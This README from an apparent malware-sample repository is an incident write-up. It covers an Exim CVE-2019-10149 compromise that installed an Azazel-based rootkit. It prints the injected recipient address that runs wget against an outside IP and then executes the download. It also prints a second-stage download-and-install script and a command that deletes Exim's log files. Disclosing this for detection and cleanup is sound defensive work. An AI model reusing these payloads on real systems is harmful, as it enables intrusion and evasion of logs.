# Libaz

Recently someone used a known Exim exploit [CVE-2019-10149](https://www.exim.org/static/doc/security/CVE-2019-10149.txt) on a unpatched server. We found out very fast due to Exim not being able to boot. We secured as much of the trail as we could to maybe help you deal with this yourself.

## The infection
A infected email was sent to the server which performed a malicious download and install of a script. We noticed an entry like this in our maillog:
```
Jun 19 12:12:31 mail exim[14263]: 2019-06-19 12:12:31 1hdXZe-0003dl-0j ** root+${run{\x2Fbin\x2Fsh\t-c\t\x22wget\x2064.50.180.45\x2fsx\x20\x2dO\x20sx\x3bchmod\x20\x2bx\x20sx\x3b\x2e\x2fsx\x22}}@servername.tld: Too many "Received" headers - suspected mail loop
```
Which translates to:
```
root+${run{/bin/sh\t-c\t"wget 64.50.180.45/sx -O sx;chmod +x sx;./sx"}}@servername.tld
```

When fetching this url we got this:
```
wget 64.50.180.45/zlib.tgz -O zlib.tgz
tar zxvf zlib.tgz
cd libaz
./install
cd ..
rm -rf sx libaz zlib.tgz
```

So again we followed the path and retreived the zlib.rgz. Which brings us here in the repo.

We were triggered by Exim giving errors with a non-existing logfil which, looking back, made sence as the last line in the install script is:
```
rm -rf /var/log/exim_mainlog /var/log/exim_paniclog /var/log/exim_rejectlog
```

Which seems a bit overkill to just remove the entry created by the malicious download. If they did not removed the entire logfiles we probably would not have noticed the infection as fast as we did this time.

## Centos incompatibility
After decypting the values in the `const.h` file we noticed a lot of flaws for the setup of the server (wrong paths, files etc) resulting in the exploit failing to really settle comfortably. There were some suspicous files installed but not executed, the services were not running and backports were not
accessible. what we found were a preloader in `/etc/ld.so.preload` and `/lib/libgrubd.so`. Using various tools and methods we determined the infection was probably failed. Just to be sure we isolated the server, restored a backup, patched Exim and continued with our lives. 

Ps. See `const.h-decrypted` for the decrypted contents. 

## Azazel rootkit
The script is based on the [Azazel rootkit](https://github.com/chokepoint/azazel) although not all code matches (probably to work around some known issues in this no longer maintained rootkit).

## References
- http://seclist.us/killrk-is-a-azazel-and-jynx2-rootkit-removal-script.html for some insights in the scripts and their locations
- https://weekly-geekly.github.io/articles/212769/index.html for better understanding of the Azazel kit
